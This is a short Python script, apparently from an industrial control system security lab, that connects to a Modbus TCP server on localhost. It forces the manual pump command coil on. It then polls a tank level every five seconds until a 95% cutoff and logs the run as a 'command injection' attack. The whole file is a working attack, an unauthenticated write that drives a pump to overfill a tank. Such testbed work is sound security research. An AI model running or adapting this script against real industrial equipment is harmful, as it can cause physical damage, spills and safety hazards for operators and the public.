from pymodbus.client import ModbusTcpClient
import time, datetime, csv

HOST = 'localhost'
PORT = 5021
UNIT = 1

client = ModbusTcpClient(HOST, port=PORT)
client.connect()

log = []
t_start = datetime.datetime.utcnow().isoformat()
print(f"=== COMMAND INJECTION START: {t_start} ===")
print("Forcing CmdPompeManu (coil 9) = True")

r = client.write_coil(9, True, device_id=UNIT)
log.append((datetime.datetime.utcnow().isoformat(), 'write_coil', 9, True, r.isError()))

for i in range(60):  # up to 5 minutes
    time.sleep(5)
    reg = client.read_holding_registers(0, count=1, device_id=UNIT)
    level = reg.registers[0]
    pump = client.read_coils(0, count=1, device_id=UNIT).bits[0]
    ts = datetime.datetime.utcnow().isoformat()
    log.append((ts, 'read_level', 0, level, False))
    print(f"{ts}  tank_level={level}  pump_coil={pump}")
    if level >= 95:
        print(">>> 95% SAFETY CUTOFF REACHED <<<")
        break

t_end = datetime.datetime.utcnow().isoformat()
print(f"=== COMMAND INJECTION END: {t_end} ===")

with open('attack_command_injection_log.csv', 'w', newline='') as f:
    w = csv.writer(f)
    w.writerow(['timestamp','action','address','value','is_error'])
    w.writerows(log)

client.close()
